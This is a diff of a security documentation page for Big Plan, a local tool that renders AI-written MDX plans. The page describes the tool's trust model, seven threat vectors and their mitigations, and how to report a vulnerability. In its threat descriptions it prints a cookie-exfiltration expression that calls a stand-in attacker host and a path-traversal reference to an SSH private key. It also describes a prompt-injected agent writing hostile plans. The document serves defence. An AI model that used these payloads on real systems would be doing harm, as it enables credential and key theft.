@@ -1,136 +1,141 @@
 ---
 title: Security
-description: How Big Plan's local runtime is designed, what it does and does not protect against, and how to report a vulnerability.
+description: Big Plan's security posture - the trust model, the ways it could be attacked, what stops each one, and the limits it accepts rather than hides.
 ---
 
-Big Plan runs entirely on your machine. It makes no outbound requests to remote services, it
-reads and writes plan files and its own state directory, and the local review runtime
-communicates only over loopback.
+Big Plan takes a document written by an AI agent, renders it into HTML, serves it from a local
+web server, and lets that agent write to a file on your disk. Every one of those steps is a place
+something could go wrong, so this page is not a policy list. It is the actual posture: what Big
+Plan assumes, how it could be attacked, and what stops each attack.
 
-This page is the canonical security policy. The repository's
-[`SECURITY.md`](https://github.com/josh-padnick/big-plan/blob/main/SECURITY.md) points here
-rather than repeating it.
+## The trust model
 
-## Reporting a vulnerability
+Three assumptions decide everything else:
 
-Report security issues privately through GitHub, not in a public issue:
+1. **Plan content is untrusted.** An agent wrote it. It may be wrong, and it may be adversarial —
+   whether because the agent was prompt-injected by a repository it read, or because someone
+   handed you a plan file. Plan text is data, never instructions and never code.
+2. **Loopback is not an authentication boundary.** `127.0.0.1` sounds private and is not. Any web
+   page your browser has open can send requests to it, and any process running as you can too.
+   Every request is authorised on its own merits rather than trusted for arriving locally.
+3. **An attacker already running code as you has won.** Big Plan is not a sandbox and does not
+   claim to defend against that. Where a mitigation would be theatre against such an attacker, it
+   is documented as an accepted limit instead of implemented.
 
-1. Open [the repository's security advisories
-   page](https://github.com/josh-padnick/big-plan/security/advisories/new).
-2. Describe what an attacker can do, the version you tested, and the smallest reproduction you
-   have.
-3. Include the platform and Node.js version if the issue depends on either.
+Nothing leaves your machine. There is no account, no hosted service, and no outbound request from
+the CLI or from a rendered document.
 
-Please do not open a public issue, pull request, or discussion for a suspected vulnerability, and
-please do not post a working exploit publicly before a fix ships.
+## Threat vectors
 
-:::caution[Private reporting is still being switched on]
-GitHub's private vulnerability reporting is not yet enabled for this repository, so the advisory
-link above returns a 404 until the maintainer turns it on. If that happens, **do not describe the
-issue in a public issue, pull request, or discussion.** Ask the maintainer to enable private
-vulnerability reporting, saying only that you have a security report and nothing about what it
-is, and send the details once the form opens.
-:::
+### 1. A plan that carries code
 
-Reports are answered on a best-effort basis: we acknowledge, then come back with a severity
-judgement and a fix plan or an explanation of why we do not consider it a vulnerability. Fixes
-ship as soon as they are ready and disclosure is coordinated with the reporter, who is credited
-unless they ask otherwise.
+**The attack.** Plans are MDX, and MDX is JavaScript-adjacent by design: it supports `import`,
+expressions, and inline JSX. An agent that has been prompt-injected writes a plan containing
+`{fetch('http://attacker/'+document.cookie)}` or an `onClick` handler. You open the document and
+it runs as you.
 
-## Scope
+**What stops it.** Plan-authored code never reaches the renderer. The compiler rejects it as a
+diagnostic instead of evaluating it. Given a plan containing all three:
 
-**In scope:** anything that lets a plan, a web page, or a remote party read or write your files,
-reach the review runtime's API, or execute code through Big Plan. A defect in Node.js, npm, or a
-third-party dependency is in scope **when Big Plan's use of it gives you a way to exploit Big
-Plan** — report it here and upstream too.
+```text
+$ big-plan validate bad.mdx
+error: Cannot validate document with invalid MDX
+code: VALIDATION_ERROR
+help[3]: "5:1 ESM import/export statements are not supported",
+         "7:1 Inline JSX is not supported; components must be flow-level",
+         "9:1 Flow expressions are not supported"
+```
 
-**Out of scope:** an upstream defect with no Big-Plan-specific path to exploit it; attacks that
-require an attacker already executing code as you locally; and issues needing physical access.
-
-**Do not report** issues that require an attacker who already runs code as you on your own
-machine. Big Plan's local runtime is explicitly not a boundary against that.
-
-## Rendered plans are inert
-
-A rendered plan is one self-contained HTML file. Plan sources are MDX, but **plan-authored code
-never executes**: the compiler rejects ESM `import`/`export` statements, flow and text
-expressions, and inline JSX as compile errors rather than evaluating them. A plan cannot
-introduce script into its own rendered document.
-
-The document embeds its own styles, fonts, and branding and makes no external requests, so
-opening one does not contact any server. It stays fully readable with JavaScript disabled.
-
-Because arbitrary HTML is arbitrary script, `big-plan review` always renders the document in
-process from the authoritative MDX and never serves a pre-existing `.html` file.
+A plan cannot introduce script into its own rendered document. What it _can_ do is choose from a
+fixed library of components, whose markup Big Plan writes and the plan only fills with data.
 
 An invalid document never renders partially. Validation collects every recoverable problem and
-fails with the complete list, because a silently degraded document would be worse than a failed
-one: the entire product is trust in what the reviewer approves.
+fails with the complete list, because a silently degraded document is worse than a failed one:
+the whole product is trust in what you approved.
 
-## The local review runtime
+### 2. A web page that reaches your review runtime
 
-`big-plan review` starts a local server. Loopback is deliberately **not** treated as an
-authentication boundary — any page your browser happens to be showing can reach `127.0.0.1`, and
-any process running as you can too — so every request is authorised on its own merits:
+**The attack.** `big-plan review` starts an HTTP server on loopback. While you read your plan in
+one tab, any other tab can `fetch()` that server, or an attacker's DNS can resolve their hostname
+to `127.0.0.1` and turn their page into a same-origin one (DNS rebinding). Either way they read
+your plan, or post an approval you never gave.
 
-- The runtime binds explicitly to `127.0.0.1` on an ephemeral port. Never `0.0.0.0`, never a
-  hostname. The saved-link service binds the same way on port `8790` by default; `BIG_PLAN_PORT`
-  changes it.
-- A per-plan review token is injected into the one document the runtime serves. Every API request
-  must carry it in a header, so it stays out of browser history, referrers, and server logs.
-- Requests whose `Host` header is not the runtime's or the local service's address are refused.
-  **That allow-list, not the socket address, is what defeats DNS rebinding.**
-- No CORS allowance is ever sent, and a foreign `Origin` or a `Sec-Fetch-Site` other than
-  `same-origin` is refused outright. CORS hides a response; it does not stop a write.
-- Routes and methods are a fixed allow-list. There is no general static-file route and no
-  directory listing. The plan-picture route serves only supported picture types, requires the
-  requested and real paths to stay inside the plan directory with no dot-prefixed segment, and
-  enforces a size limit.
+**What stops it — four independent controls, because any one of them can be wrong:**
 
-Three read-only GET requests do not use the token: the document route, which renders the selected
-MDX rather than serving arbitrary HTML; plan-picture requests, which accept only supported
-picture types; and stored review-image requests, which use a validated content digest.
+- **Bound explicitly to `127.0.0.1`** on an ephemeral port. Never `0.0.0.0`, never a hostname.
+- **A per-session token**, 32 random bytes, injected into the one document the runtime serves and
+  required on every API request. It travels in a header, so it stays out of browser history,
+  referrers, and server logs, and it is compared with a constant-time equality check.
+- **A `Host` header allow-list.** A request whose `Host` is not this runtime's or the local
+  service's address is refused. That allow-list, not the socket address, is what actually defeats
+  DNS rebinding — a rebound request arrives on `127.0.0.1` carrying the attacker's hostname.
+- **No CORS allowance is ever sent**, and a foreign `Origin` or a `Sec-Fetch-Site` other than
+  `same-origin` is refused outright. CORS hides a _response_; it does not stop a _write_, so it is
+  not relied on as the control.
 
-Reviewer and plan text remain plain, untrusted data in the browser and in the agent brief.
-Sending a feedback package grants only the authority to consider the notes while revising the
-named plan source.
+Three read-only GET requests deliberately skip the token: the document route, which renders the
+authoritative MDX rather than serving arbitrary HTML; plan pictures, which accept only supported
+picture types; and stored review images, addressed by a validated content digest.
 
-## One writer owns the plan
+### 3. A rendered document that phones home
 
-The plan file on disk is authoritative, and exactly one code path may write it. An agent's edits
-go into a claim-scoped stage rather than the plan itself. A stage publishes only under the
-plan-mutation lock, only while the recorded lock holder, the claim generation, and the source's
-base digest all still hold, and only through a single atomic rename, with a journal written
-beforehand so an interrupted publish can be settled after a crash.
+**The attack.** You render a plan and send the HTML to a colleague. It quietly beacons who opened
+it, when, and from where — or it pulls a script from a CDN that is later compromised.
 
-A reviewer's revert crosses that same boundary and re-proves the digest it was computed against.
-That is why a revision an agent published while you were deciding refuses the revert instead of
-disappearing under it.
+**What stops it.** The document embeds its own styles, fonts, and branding and makes no external
+requests at all. Opening one contacts no server, including ours. It stays fully readable with
+JavaScript disabled, and Big Plan ships no separate script-free variant to keep that honest.
 
-**One local filesystem limit is accepted rather than fixed.** Node offers no file-open relative
-to an already-open directory handle, so someone who can already write inside your plan directory
-can swap an ancestor directory between the moment a path is validated and the moment it is
-opened. Closing that race is not possible with the available primitives, and such an attacker
-already has the access the check would protect, so Big Plan documents the limit instead of
-pretending to remove it.
+`big-plan review` always renders the document in process from the authoritative MDX and **never
+serves a pre-existing `.html` file**, because arbitrary HTML is arbitrary script running on the
+runtime's own origin.
 
-## Supply chain and releases
+### 4. Reading a file outside the plan directory
 
-Big Plan ships as the [`big-plan`](https://www.npmjs.com/package/big-plan) npm package and is
-normally run with `npx big-plan` or installed with `npm install -g big-plan`.
+**The attack.** A plan references `![](../../../.ssh/id_rsa)`. The picture route obligingly opens
+it and serves your private key to whatever can reach the runtime.
 
-- **An unversioned `npx` run may use a local package.** A machine that runs `npx big-plan` may
-  execute a matching version already installed in the local project rather than fetch a release.
-  Pin an exact version (`npx big-plan@<version>`) if your environment requires a fixed, reviewed
-  release.
-- **Releases are published with npm provenance, from CI only.** Publishing happens exclusively in
-  the tagged-release GitHub Actions workflow, using npm Trusted Publishing over OIDC rather than
-  a long-lived token. That workflow refuses to publish unless the tag equals the package version
-  and points at a commit on `main`, and it runs the full lint, build, drift, unit, and
-  end-to-end suites first.
+**What stops it.** The plan-picture route is not a static file server — there is no general
+static route and no directory listing anywhere. It serves only supported picture types; the
+requested path and the resolved real path must both stay inside the plan directory; neither may
+contain a dot-prefixed segment; the opened file must match the path that was accepted, must be a
+regular file, and must be within the size limit. Request bodies are capped at 1 MB, images at
+their own limit.
 
-The provenance attestation lets you verify a published tarball was built by that workflow from
-this repository:
+### 5. Writing the plan behind your back
+
+**The attack.** You approve what you read. Meanwhile the agent rewrites the plan file underneath
+you, so the bytes on disk are not the bytes you approved — or two writers race and the file ends
+up a mixture of both.
+
+**What stops it.** The plan file has exactly one writer, and the agent is not it. Agent edits go
+into a claim-scoped private stage. A stage publishes only under the plan-mutation lock, only
+while the recorded lock holder, the claim generation, and the source's base digest all still
+hold, and only through a single atomic rename — with a journal written beforehand so an
+interrupted publish settles to exactly one answer after a crash rather than to a guess.
+
+Your own writes cross the same boundary. A revert re-proves the digest it was computed against,
+which is why a revision the agent published while you were deciding **refuses** the revert rather
+than silently disappearing under it. Approval stamps your answers into the source inside the
+approval commit's own hold of that lock, so it cannot go stale against its own write.
+
+### 6. The install path
+
+**The attack.** You run `npx big-plan`. Something other than the release you meant to run
+executes, with your privileges, in your project.
+
+**What stops it, and what does not:**
+
+- **Releases are published from CI only, with npm provenance**, using Trusted Publishing over
+  OIDC rather than a long-lived token. The workflow refuses to publish unless the tag equals the
+  package version and points at a commit on `main`, and it runs the full lint, build, drift,
+  unit, and end-to-end suites first. Runtime dependencies are audited at high severity on every CI
+  run.
+- **An unversioned `npx` run is a real hazard, and this is the honest caveat**: `npx big-plan` may
+  execute a matching version already installed in your project rather than fetch a release. Pin an
+  exact version if your environment requires a fixed, reviewed one.
+
+Verify a published tarball was built by that workflow from this repository:
 
 ```sh
 version="${BIG_PLAN_VERSION:?Set BIG_PLAN_VERSION to the exact version to verify}"
@@ -139,12 +144,75 @@ npm --prefix "$audit_dir" install "big-plan@$version"
 npm --prefix "$audit_dir" audit signatures
 ```
 
-`npm audit signatures` needs npm 9.5 or newer, and it verifies the whole installed dependency
-graph in that directory rather than Big Plan alone — installing into an empty prefix first is
-what keeps its answer about the release you meant to check.
+`npm audit signatures` needs npm 9.5 or newer and verifies the whole installed graph in that
+directory, so installing into an empty prefix first is what keeps its answer about the release you
+meant to check.
 
-## Supported versions
+The setup prompt on [Install Big Plan](/intro/installation/) points your agent at
+`https://bigplan.dev/setup.md`. That is a document your agent reads, on a site we control; it is
+not a script that is piped into a shell.
 
-Big Plan is pre-1.0 and has [no compatibility contract yet](/alpha/). Only the latest published
-version receives security fixes. There are no backports; the fix for a reported issue is to
-upgrade.
+### 7. A confused or compromised agent
+
+**The attack.** The agent connected to your review is prompt-injected by something it read, and
+tries to use the review channel to do more than revise the plan.
+
+**What stops it.** Reviewer text and plan text stay plain, untrusted data in the browser and in
+the agent brief. Sending a feedback package grants exactly one thing: the authority to consider
+those notes while revising the named plan source. The agent still cannot write the plan file
+directly — every edit goes through the staged publication in vector 5 — and it cannot approve on
+your behalf.
+
+## Limits Big Plan accepts rather than hides
+
+**A local attacker.** Anyone already running code as you can read your plans, drive your browser,
+and write your files without involving Big Plan at all. The local runtime is explicitly not a
+boundary against that, and issues that require it are out of scope.
+
+**One filesystem race.** Node offers no file-open relative to an already-open directory handle, so
+someone who can already write inside your plan directory can swap an ancestor directory between
+the moment a path is validated and the moment it is opened, and make the picture route open a file
+outside the plan directory. Closing that race is not possible with the available primitives, and
+such an attacker already has the access the check would protect. It is documented rather than
+papered over.
+
+**Pre-1.0.** Only the latest published version receives security fixes. There are no backports;
+the fix for a reported issue is to upgrade. See [what alpha means](/alpha/).
+
+## Reporting a vulnerability
+
+Report privately through GitHub, never in a public issue:
+
+1. Open [the repository's security advisories
+   page](https://github.com/josh-padnick/big-plan/security/advisories/new).
+2. Describe what an attacker can do, the version you tested, and the smallest reproduction you
+   have.
+3. Include the platform and Node.js version if the issue depends on either.
+
+Please do not open a public issue, pull request, or discussion for a suspected vulnerability, and
+please do not publish a working exploit before a fix ships.
+
+:::caution[Private reporting is still being switched on]
+GitHub's private vulnerability reporting is not yet enabled for this repository, so the advisory
+link above returns a 404 until the maintainer turns it on. If that happens, **do not describe the
+issue in a public issue, pull request, or discussion.** Ask the maintainer to enable private
+vulnerability reporting, saying only that you have a security report and nothing about what it is,
+then send the details once the form opens.
+:::
+
+**In scope:** anything that lets a plan, a web page, or a remote party read or write your files,
+reach the review runtime's API, or execute code through Big Plan. A defect in Node.js, npm, or a
+dependency is in scope **when Big Plan's use of it gives you a way to exploit Big Plan** — report
+it here and upstream too.
+
+**Out of scope:** an upstream defect with no Big-Plan-specific path to exploit it, attacks that
+require an attacker already executing code as you, and issues needing physical access.
+
+Reports are answered on a best-effort basis: we acknowledge, then come back with a severity
+judgement and either a fix plan or an explanation of why we do not consider it a vulnerability.
+Fixes ship as soon as they are ready, and disclosure is coordinated with the reporter, who is
+credited unless they ask otherwise.
+
+This page is the canonical security policy. The repository's
+[`SECURITY.md`](https://github.com/josh-padnick/big-plan/blob/main/SECURITY.md) points here rather
+than repeating it.
